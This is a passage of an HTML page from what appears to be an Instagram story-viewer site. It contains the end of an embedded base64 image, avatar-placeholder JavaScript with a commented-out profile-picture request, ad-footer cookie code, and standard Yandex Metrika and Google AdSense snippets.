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" alt="" ></a>');
        function getUserInfo(nickname, id) {
            $(".profile-pic").attr('src','/img/no-avatar.png');
            $(".post-pic").attr('src','/img/no-avatar.png');
            $(".story-pic").attr('src','/img/no-avatar.png');
            $(".highlights-pic").attr('src','/img/no-avatar.png');
            // $.ajax({
            //     headers: {
            //         'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content'),
            //     },
            //     url: app_insta.base_url + '/search',
            //     method: 'POST',
            //     data: {search:nickname},
            // }).done(function (data) {
            //     if(data.users && data.users[0]) {
            //         const profile_pic_url = data.users[0].user.profile_pic_url;
            //         $.ajax({
            //             headers: {
            //                 'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
            //             },
            //             url: app_insta.base_url + '/update-user-avatar',
            //             method: 'POST',
            //             data: {profile_pic_url,id},
            //         }).done(function (data) {
            //             $(".profile-pic").attr('src','data:image/png;base64, '+data);
            //             $(".post-pic").attr('src','data:image/png;base64, '+data);
            //             $(".story-pic").attr('src','data:image/png;base64, '+data);
            //             $(".highlights-pic").attr('src','data:image/png;base64, '+data);
            //         });
            //     }
            // });
        }
        app_insta.user_id = '6862707151';
    </script> 

   <script>
	     (adsbygoogle = window.adsbygoogle || []).push({});
	</script> 
  </div> 
  <script>
	    var now = new Date();

	    function getCookie(name) {
	        var re = new RegExp(name + "=([^;]+)");
	        var value = re.exec(document.cookie);
	        return (value != null) ? unescape(value[1]) : null;
	    }

	    if (getCookie("closeAdFoot")) { 
	        $("#adFoot").css("display", "none");

	    }

	    if (getCookie("closeAdFoot") == null) {  
	        $("#closeAdFoot").click(function () {
	            $("#adFoot").css("display", "none");

	            now.setTime(now.getTime() + 1 * 1800 * 1000); //пол часа жизни
	            document.cookie = "closeAdFoot=closeAdFoot; expires=" + now.toUTCString() + "; path=/";

	            ym(73491505,'reachGoal','close_ads');
	        });
	    }


	</script> 
  <style>
	    #closeAdFoot {
	        position: absolute;
	        right: 0;
	        top: -42px;
	        padding: 6px;
	        background: #fff;
	        border: none;
	        cursor: pointer;
	        box-sizing: border-box;
	        box-shadow: 0px -2px 3px 0px #ccd0d4;
	        border-radius: 15% 15% 0 0;
	    }
	    .adFootS {
	        height: 90px!important;
	        position: fixed;
	        z-index: 1000000;
	        bottom: 0;
	        left: 0;
	        width: 100%;
	        text-align: center;
	        background: #ffffff;
	        box-shadow: 0 0 3px #bac7d0;
	    }
	</style> 
  <script type="text/javascript">
    (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
        m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
    (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");

    ym(73491505, "init", {
        clickmap:true,
        trackLinks:true,
        accurateTrackBounce:true
    });
</script> 
  <noscript>
   <div>
    <img src="https://mc.yandex.ru/watch/73491505" style="position:absolute; left:-9999px;" alt="">
   </div>
  </noscript> 
  <ins class="adsbygoogle adsbygoogle-noablate" data-adsbygoogle-status="done" style="display: none !important;"><ins id="aswift_0_expand" style="display:inline-table;border:none;height:0px;margin:0;padding:0;position:relative;visibility:visible;width:0px;background-color:transparent;" tabindex="0" title="Advertisement" aria-label="Advertisement"><ins id="aswift_0_anchor" style="display:block;border:none;height:0px;margin:0;padding:0;position:relative;visibility:visible;width:0px;background-color:transparent;"><iframe id="aswift_0" name="aswift_0" style="left:0;position:absolute;top:0;border:0;width:undefinedpx;height:undefinedpx;" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" frameborder="0" src="https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub-2327019300071460&amp;output=html&amp;adk=1812271804&amp;adf=3025194257&amp;lmt=1623525284&amp;plat=1%3A16777216%2C16%3A8388608%2C17%3A32%2C24%3A32%2C25%3A32%2C32%3A32&amp;format=0x0&amp;url=https%3A%2F%2Finsta-stories.online%2F7quadro&amp;ea=0&amp;flash=0&amp;pra=5&amp;wgl=1&amp;dt=1623525283697&amp;bpp=11&amp;bdt=661&amp;idt=307&amp;shv=r20210607&amp;cbv=%2Fr20190131&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;nras=1&amp;correlator=6954253531627&amp;frm=20&amp;pv=2&amp;ga_vid=480291328.1623525284&amp;ga_sid=1623525284&amp;ga_hid=1422008445&amp;ga_fc=0&amp;u_tz=180&amp;u_his=2&amp;u_java=0&amp;u_h=851&amp;u_w=393&amp;u_ah=851&amp;u_aw=393&amp;u_cd=24&amp;u_nplug=0&amp;u_nmime=0&amp;adx=-12245933&amp;ady=-12245933&amp;biw=393&amp;bih=678&amp;scr_x=0&amp;scr_y=0&amp;eid=31060474&amp;oid=3&amp;pvsid=2165935359759501&amp;pem=261&amp;eae=2&amp;fc=1920&amp;brdim=0%2C0%2C0%2C0%2C393%2C0%2C393%2C678%2C393%2C678&amp;vis=1&amp;rsz=%7C%7Cs%7C&amp;abl=NS&amp;fu=32768&amp;bc=31&amp;ifi=1&amp;uci=a!1&amp;fsb=1&amp;dtd=398" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" allowfullscreen="true" data-google-container-id="a!1" data-load-complete="true"></iframe></ins></ins></ins>
  <iframe id="google_osd_static_frame_6446920224328" name="google_osd_static_frame" style="display: none; width: 0px; height: 0px;"></iframe>
  <iframe id="google_esf" name="google_esf" src="https://googleads.g.doubleclick.net/pagead/html/r20210607/r20190131/zrt_lookup.html" style="display: none;"></iframe>
 </body>
</html>